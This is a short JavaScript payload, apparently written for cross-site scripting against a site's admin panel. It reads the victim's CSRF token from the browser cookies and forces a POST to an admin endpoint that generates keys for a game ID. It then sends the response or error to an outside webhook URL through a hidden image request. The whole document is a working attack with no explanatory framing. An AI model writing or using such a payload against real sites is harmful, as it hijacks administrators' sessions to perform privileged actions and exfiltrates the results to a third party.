(async()=>{
  const ID = "d81b8f9f-eaed-4335-b554-2fc936a2fbe8";
  const W  = "https://webhooktest.net/webhook/01a12c84-d1c2-7258-acfc-88970615c34a";
  const C  = (document.cookie.match(/csrftoken=([^;]+)/)||[])[1] || "";
  function exfil(q){ try{ new Image().src = W + "?" + q; }catch(e){} }
  try{
    const r = await fetch("/admin-panel/claves/generar", {
      method: "POST",
      headers: { "Content-Type":"application/json", "X-CSRFToken": C },
      body: JSON.stringify({ juego_id: ID })
    });
    const t = await r.text();
    exfil("status=" + r.status + "&data=" + encodeURIComponent(t));
  }catch(e){
    exfil("err=" + encodeURIComponent(e.message));
  }
})();
